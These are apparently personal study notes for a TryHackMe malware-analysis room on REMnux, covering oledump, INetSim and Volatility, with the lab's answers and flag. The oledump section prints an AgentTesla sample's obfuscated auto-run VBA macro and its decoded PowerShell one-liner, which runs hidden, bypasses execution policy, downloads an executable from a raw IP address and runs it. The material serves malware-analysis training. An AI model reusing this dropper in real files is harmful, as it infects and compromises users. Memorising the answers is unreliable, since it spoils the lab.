
#Subscribers 

https://tryhackme.com/r/room/remnuxgettingstarted

https://www.youtube.com/watch?v=XkTHo99AoMQ

MUST REDO

Analysing potentially malicious software can be daunting, especially when this is part of an ongoing security incident. This analysis puts much pressure on the analyst. Most of the time, the results must be as accurate as possible, and analysts use different tools, machines, and environments to achieve this. In this room, we will use the REMnux VM.

The REMnux VM is a specialised Linux distro. It already includes tools like Volatility, YARA, Wireshark, oledump, and INetSim. It also provides a sandbox-like environment for dissecting potentially malicious software without risking your primary system. It's your lab set up and ready to go without the hassle of manual installations.

## file analysis

In this task, we will use `oledump.py` to conduct static analysis on a potentially malicious Excel document. 

`Oledump.py` is a Python tool that analyzes **OLE2** files, commonly called Structured Storage or Compound File Binary Format. **OLE** stands for **Object Linking and Embedding,** a proprietary technology developed by Microsoft. OLE2 files are typically used to store multiple data types, such as documents, spreadsheets, and presentations, within a single file. This tool is handy for extracting and examining the contents of OLE2 files, making it a valuable resource for forensic analysis and malware detection.

Let's start!

Using the virtual machine attached to task 2, the **REMnux VM**, navigate to the `/home/ubuntu/Desktop/tasks/agenttesla/` directory. Our target file is named `agenttelsa.xlsm`. Run the command `oledump.py agenttesla.xlsm`. See the terminal below.

```
cd /home/ubuntu/Desktop/tasks/agenttesla/
oledump.py agenttesla.xlsm

A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'

```

Based on OleDump's file analysis, a VBA script might be embedded in the document and found inside `xl/vbaProject.bin`. Therefore, oledump will assign this with an index of A, though this can sometimes differ. The A (index) +Numbers are called **data streams**. 

Now, we should be aware of the data stream with the capital letter **M**. This means there is a **Macro**, and you might want to check out this data stream, `'VBA/ThisWorkbook'`.

So, let's check it out! Let's run the command `oledump.py agenttesla.xlsm -s 4`. This command will run the oledump and look into the actual data stream of interest using the parameter `-s 4`,  wherein the `-s` parameter is short for `-select`  and the number four(`4`) as the data stream of interest is in the 4th place(`A4: M 688 'VBA/ThisWorkbook'`)

```
oledump.py agenttesla.xlsm -s 4
oledump.py agenttesla.xlsm -s 4 --vbadecompress

Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Workbook_Open()
Dim Sqtnew As String, sOutput As String
Dim Mggcbnuad As Object, MggcbnuadExec As Object
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' } �Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
Set Mggcbnuad = CreateObject("WScript.Shell")
Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)

```

copy and paste into cyberchef
```
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' } �Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")

find/replace * simple string
find/replace ^ simple string

Sqtnew = "powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } �PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"

```

  
Let's break it down!

- So, in PowerShell, running the `-WindowStyle` parameter allows you to control how the PowerShell window appears when executing a script or command. In this case, `hidden` means that the PowerShell window **won’t be visible to the user**.
- By default, PowerShell restricts script execution for security reasons. The `-executionpolicy` parameter allows you to override this policy. The `bypass` means that the **execution policy is temporarily ignored**, allowing any script to run without restriction.
- The `Invoke-WebRequest` is commonly used for downloading files from the internet.
    - The `-Uri` Specifies the URL of the web resource you want to retrieve. In our case, the script is downloading the resource `Doc-3737122pdf.exe` from `http://193.203.203.67/rt`/.
    - The `-OutFile` specifies the local file where the downloaded content will be saved.  In this case, the Doc-3737122pdf.exe will be saved to $TempFile.
- The `Start-Process` is used to execute the downloaded file that is stored in `$TempFile` after the web request.

To summarize, when the document `agenttesla.xlsm` is opened, a Macro will run! This Macro contains a VBA script. The script will run and will be running a PowerShell to download a file named `Doc-3737122pdf.exe` from `http://193.203.203.67/rt/`, save it to a variable $TempFile, then execute or start running the file inside this variable, which is a binary or a .exe file (`Doc-3737122pdf.exe`**)**. This is a usual technique used by threat actors to avoid early detection. Pretty nasty, right?!

Kudos to you for figuring it out!

```
What Python tool analyzes OLE2 files, commonly called Structured Storage or Compound File Binary Format?

oledump.py

What tool parameter we used in this task allows you to select a particular data stream of the file we are using it with?

-s

During our analysis, we were able to decode a PowerShell script. What command is commonly used for downloading files from the internet?
Invoke-WebRequest

What file was being downloaded using the PowerShell script?
Doc-3737122pdf.exe

During our analysis of the PowerShell script, we noted that a file would be downloaded. Where will the file being downloaded be stored?
$TempFile

Using the tool, scan another file named **possible_malicious.docx** located in the `/home/ubuntu/Desktop/tasks/agenttesla/` directory. How many data streams were presented for this file?

16

Using the tool, scan another file named **possible_malicious.docx** located in the `/home/ubuntu/Desktop/tasks/agenttesla/` directory. At what data stream number does the tool indicate a macro present?

8

```

## fake network 

During dynamic analysis, it is essential to observe the behaviour of potentially malicious software: especially its network activities. There are many approaches to this. We can create a whole infrastructure, a virtual environment with different core machines, and more. Alternatively, there is a tool inside our REMnux VM called **INetSim: Internet Services Simulation Suite****!**

We will utilize INetSim's features to simulate a real network in this task.
### Virtual Machines

For this task, we will use two (2) machines. The first is our REMnux machine, which is linked to the Machine Access Task. The second VM is the AttackBox. To start the AttackBox, click the blue **Start AttackBox** button at the top of the page. Do note that you can easily switch between boxes by clicking on them. See the highlighted box in the below image.

### INetSim

Before we start, we must configure the tool INetSim inside our REMnux VM. Do not worry; this is a simple change of configuration. First, check the IP address assigned to your machine. This can be seen using the command `ifconfig` or simply by checking the IP address after the **ubuntu@** from the terminal. _The IP addresses may vary._

```
10.10.16.199

sudo nano /etc/inetsim/inetsim.conf

remove # 
#dns_default_ip 10.10.16.199

sudo inetsim
```

```
Download and scan the file named **flag.txt** from the terminal using the command sudo wget https://10.10.16.199/flag.txt --no-check-certificate. What is the flag?

Tryhackme{remnux_edition}

After stopping the inetsim, read the generated report. Based on the report, what URL Method was used to get the file flag.txt?

get
```

## memory investigation

```
What plugin lists processes in a tree based on their parent process ID?

pstree

What plugin is used to list all currently active processes in the machine?

pslist

What Linux utility tool can extract the ASCII, 16-bit little-endian, and 16-bit big-endian strings?

strings

By running vol3 with the Malfind parameter, what is the first (1st) process identified suspected of having an injected code?

csrss.exe

Continuing from the previous question (Question 6), what is the second (2nd) process identified suspected of having an injected code?

winlogon.exe

By running vol3 with the DllList parameter, what is the file path or directory of the binary @WanaDecryptor@.exe?

C:\Intel\ivecuqmanpnirkt615
```

